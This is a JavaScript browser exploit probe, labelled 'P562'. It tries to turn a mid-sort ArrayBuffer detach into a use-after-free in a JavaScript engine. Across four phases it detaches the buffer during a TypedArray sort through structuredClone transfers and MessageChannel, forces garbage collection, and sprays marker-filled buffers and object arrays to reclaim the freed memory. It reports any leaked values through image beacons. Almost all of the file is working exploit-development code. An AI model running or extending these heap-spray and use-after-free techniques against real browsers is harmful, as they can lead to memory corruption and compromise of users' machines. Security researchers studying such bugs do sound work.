// CRASH_CLASS: HIGH
// PROBE P562: Double-Detach UAF via structuredClone during Sort
//
// P561 showed: structuredClone(rab, {transfer:[rab]}) detaches mid-sort,
// sort continues ~27 calls with stale backing store pointer.
// But memory isn't freed — it's moved to the clone.
//
// This probe tests: if we detach the clone too, drop all refs, GC,
// and spray same-size allocations — does sort read reclaimed memory?
//
// Uses Uint32Array (not Float64) to bypass DAZ.
// If we see spray patterns in comparator values → UAF confirmed.

document.write('<pre id="log" style="color:#0f0;background:#000;font:13px monospace;padding:8px;white-space:pre-wrap"></pre>');

(function () {
  var logEl = document.getElementById('log');
  function emit(tag, msg) {
    var line = tag + ' ' + msg;
    logEl.textContent += line + '\n';
    try {
      new Image().src = '/beacon/P562-' + encodeURIComponent(tag) +
        '?d=' + encodeURIComponent(String(msg).slice(0, 500));
    } catch (e) {}
  }

  emit('START', 'double-detach-uaf ua=' + navigator.userAgent.slice(0, 60));

  var hasClone = typeof structuredClone === 'function';
  emit('CAPS', 'clone=' + hasClone);
  if (!hasClone) { emit('ABORT', 'no structuredClone'); return; }

  // ======================== TEST A: BASELINE — confirm Uint32 sort OOB ========================
  emit('PHASE-A', 'start');
  try {
    var rabA = new ArrayBuffer(128, { maxByteLength: 512 });
    var u32A = new Uint32Array(rabA);  // 32 elements (128/4)
    for (var i = 0; i < 32; i++) u32A[i] = 32 - i;  // descending

    var aCalls = 0, aOob = 0;
    u32A.sort(function (a, b) {
      aCalls++;
      if (aCalls === 8) {
        rabA.resize(16);  // shrink to 4 Uint32 elements
      }
      if (aCalls > 8 && (a === 0 || b === 0)) aOob++;
      return a - b;
    });
    emit('A-RESULT', 'calls=' + aCalls + ' oob_zeros=' + aOob);
    // Read back
    rabA.resize(128);
    var u32r = new Uint32Array(rabA);
    var vals = [];
    for (var j = 0; j < 8; j++) vals.push(u32r[j]);
    emit('A-DATA', vals.join(','));
  } catch (e) {
    emit('A-ERR', e.name + ': ' + String(e.message).slice(0, 100));
  }
  emit('PHASE-A', 'done');

  // ======================== TEST B: DOUBLE DETACH + GC + SPRAY ========================
  // Sequence in comparator:
  //   call 3: structuredClone(rab, {transfer:[rab]}) → clone1
  //   call 5: structuredClone(clone1, {transfer:[clone1]}) → clone2
  //           clone2 = null, clone1 already detached
  //   call 6-8: allocate heavily to trigger GC
  //   call 9+: spray with MARKER pattern to reclaim freed backing store
  //   call 10+: log what sort sees — if MARKER values appear → UAF

  emit('PHASE-B', 'start');
  try {
    var MARKER = 0xBAADF00D;
    var BUFSIZE = 128;
    var rabB = new ArrayBuffer(BUFSIZE, { maxByteLength: 512 });
    var u32B = new Uint32Array(rabB);
    // Fill with descending values 32000..31969
    for (var ib = 0; ib < 32; ib++) u32B[ib] = 32000 - ib;

    var bCalls = 0, bClone1 = null, bClone2 = null;
    var bGcDone = false, bSprayDone = false;
    var bSuspect = [];  // values that aren't our originals
    var bSpray = [];
    var bGcPressure = [];

    try {
      u32B.sort(function (a, b) {
        bCalls++;

        // Step 1: first detach
        if (bCalls === 3) {
          try {
            bClone1 = structuredClone(rabB, { transfer: [rabB] });
            emit('B-DETACH1', 'ok len=' + bClone1.byteLength);
          } catch (e) {
            emit('B-DETACH1', 'FAIL ' + e.name);
          }
        }

        // Step 2: second detach — free the backing store
        if (bCalls === 5 && bClone1) {
          try {
            bClone2 = structuredClone(bClone1, { transfer: [bClone1] });
            emit('B-DETACH2', 'ok len=' + bClone2.byteLength);
            // Drop all refs to clones
            bClone1 = null;
            bClone2 = null;
          } catch (e) {
            emit('B-DETACH2', 'FAIL ' + e.name);
          }
        }

        // Step 3: GC pressure
        if (bCalls >= 6 && bCalls <= 8 && !bGcDone) {
          for (var gp = 0; gp < 2000; gp++) {
            bGcPressure.push(new ArrayBuffer(1024));
          }
          if (bCalls === 8) {
            bGcPressure = [];  // release all
            bGcDone = true;
          }
        }

        // Step 4: spray with MARKER
        if (bCalls === 9 && !bSprayDone) {
          bSprayDone = true;
          for (var sp = 0; sp < 500; sp++) {
            var sb = new ArrayBuffer(BUFSIZE);
            var sv = new Uint32Array(sb);
            for (var sk = 0; sk < sv.length; sk++) sv[sk] = MARKER;
            bSpray.push(sv);
          }
          emit('B-SPRAY', 'n=' + bSpray.length);
        }

        // Step 5: detect UAF — look for MARKER in sort values
        if (bCalls > 9) {
          if (a === MARKER || b === MARKER) {
            bSuspect.push('c' + bCalls + ':a=' + (a >>> 0).toString(16) + ',b=' + (b >>> 0).toString(16));
          }
          // Also detect non-original values (not 31969-32000 and not 0)
          if (a !== 0 && (a < 31969 || a > 32000) && a !== MARKER) {
            bSuspect.push('c' + bCalls + ':UNK_a=0x' + (a >>> 0).toString(16));
          }
          if (b !== 0 && (b < 31969 || b > 32000) && b !== MARKER) {
            bSuspect.push('c' + bCalls + ':UNK_b=0x' + (b >>> 0).toString(16));
          }
        }

        return a - b;
      });
      emit('B-SORT', 'ok calls=' + bCalls);
    } catch (e) {
      emit('B-SORT', 'threw:' + e.name + ' calls=' + bCalls);
    }

    emit('B-SUSPECTS', 'n=' + bSuspect.length);
    if (bSuspect.length > 0) {
      // Report first 20 suspect values
      for (var si = 0; si < Math.min(bSuspect.length, 20); si++) {
        emit('B-UAF', bSuspect[si]);
      }
    }

    // Check spray canaries
    var spBad = 0;
    for (var sci = 0; sci < bSpray.length; sci++) {
      for (var scj = 0; scj < bSpray[sci].length; scj++) {
        if (bSpray[sci][scj] !== MARKER) {
          spBad++;
          if (spBad <= 3) emit('B-SPRAY-CORRUPT', 'buf' + sci + '[' + scj + ']=0x' + (bSpray[sci][scj] >>> 0).toString(16));
          break;
        }
      }
    }
    emit('B-SPRAY-CHECK', 'bad=' + spBad + '/' + bSpray.length);
  } catch (e) {
    emit('B-ERR', e.name + ': ' + String(e.message).slice(0, 100));
  }
  emit('PHASE-B', 'done');

  // ======================== TEST C: OBJECT SPRAY variant ========================
  // Instead of ArrayBuffer spray, use JS objects (Array of objects with properties).
  // If GC reclaims the backing store and an object's Butterfly lands there,
  // sort would read JSCell/Structure pointers.

  emit('PHASE-C', 'start');
  try {
    var rabC = new ArrayBuffer(BUFSIZE, { maxByteLength: 512 });
    var u32C = new Uint32Array(rabC);
    for (var ic = 0; ic < 32; ic++) u32C[ic] = 50000 - ic;

    var cCalls = 0, cClone1 = null, cClone2 = null;
    var cSuspect = [];
    var cObjSpray = [];

    try {
      u32C.sort(function (a, b) {
        cCalls++;

        if (cCalls === 3) {
          try { cClone1 = structuredClone(rabC, { transfer: [rabC] }); } catch (e) {}
        }
        if (cCalls === 5 && cClone1) {
          try {
            cClone2 = structuredClone(cClone1, { transfer: [cClone1] });
            cClone1 = null;
            cClone2 = null;
          } catch (e) {}
        }

        // GC + object spray
        if (cCalls === 7) {
          // Heavy allocation to trigger GC
          var trash = [];
          for (var t = 0; t < 5000; t++) trash.push(new ArrayBuffer(256));
          trash = null;

          // Spray with arrays of objects — Butterflies contain pointers
          for (var os = 0; os < 300; os++) {
            var arr = [];
            for (var oi = 0; oi < 16; oi++) {
              arr.push({idx: os, sub: oi, tag: 'spray'});
            }
            cObjSpray.push(arr);
          }
          emit('C-SPRAY', 'objects=' + cObjSpray.length);
        }

        // Detect non-original values
        if (cCalls > 7) {
          if (a !== 0 && (a < 49969 || a > 50000)) {
            cSuspect.push('c' + cCalls + ':a=0x' + (a >>> 0).toString(16));
          }
          if (b !== 0 && (b < 49969 || b > 50000)) {
            cSuspect.push('c' + cCalls + ':b=0x' + (b >>> 0).toString(16));
          }
        }

        return a - b;
      });
      emit('C-SORT', 'ok calls=' + cCalls);
    } catch (e) {
      emit('C-SORT', 'threw:' + e.name + ' calls=' + cCalls);
    }

    emit('C-SUSPECTS', 'n=' + cSuspect.length);
    if (cSuspect.length > 0) {
      for (var ci2 = 0; ci2 < Math.min(cSuspect.length, 20); ci2++) {
        emit('C-UAF', cSuspect[ci2]);
      }
    }
  } catch (e) {
    emit('C-ERR', e.name + ': ' + String(e.message).slice(0, 100));
  }
  emit('PHASE-C', 'done');

  // ======================== TEST D: TRIPLE DETACH — MessageChannel ========================
  // postMessage with transfer is another detach path.
  // Sequence: rab → clone1 (structuredClone) → port.postMessage(clone1, [clone1])
  // port's message handler is async, but the detach is sync.

  emit('PHASE-D', 'start');
  try {
    var rabD = new ArrayBuffer(BUFSIZE, { maxByteLength: 512 });
    var u32D = new Uint32Array(rabD);
    for (var id = 0; id < 32; id++) u32D[id] = 60000 - id;

    var mc = new MessageChannel();
    var dCalls = 0, dClone = null;
    var dSuspect = [];

    try {
      u32D.sort(function (a, b) {
        dCalls++;

        if (dCalls === 3) {
          try { dClone = structuredClone(rabD, { transfer: [rabD] }); } catch (e) {}
        }
        if (dCalls === 5 && dClone) {
          try {
            // Transfer clone to a port — detaches clone, memory in transit
            mc.port1.postMessage(dClone, [dClone]);
            dClone = null;
            emit('D-PORT', 'transferred');
          } catch (e) {
            emit('D-PORT-ERR', e.name + ': ' + String(e.message).slice(0, 60));
          }
        }
        if (dCalls === 7) {
          // Close both ports — message never delivered, backing store orphaned?
          mc.port1.close();
          mc.port2.close();
          // GC pressure
          var trash2 = [];
          for (var t2 = 0; t2 < 3000; t2++) trash2.push(new ArrayBuffer(512));
          trash2 = null;
          emit('D-CLOSED', 'ports closed + gc pressure');
        }

        if (dCalls > 7) {
          if (a !== 0 && (a < 59969 || a > 60000)) {
            dSuspect.push('c' + dCalls + ':a=0x' + (a >>> 0).toString(16));
          }
          if (b !== 0 && (b < 59969 || b > 60000)) {
            dSuspect.push('c' + dCalls + ':b=0x' + (b >>> 0).toString(16));
          }
        }

        return a - b;
      });
      emit('D-SORT', 'ok calls=' + dCalls);
    } catch (e) {
      emit('D-SORT', 'threw:' + e.name + ' calls=' + dCalls);
    }

    emit('D-SUSPECTS', 'n=' + dSuspect.length);
    if (dSuspect.length > 0) {
      for (var di2 = 0; di2 < Math.min(dSuspect.length, 20); di2++) {
        emit('D-UAF', dSuspect[di2]);
      }
    }
  } catch (e) {
    emit('D-ERR', e.name + ': ' + String(e.message).slice(0, 100));
  }
  emit('PHASE-D', 'done');

  emit('ALIVE', 'all tests completed');
})();
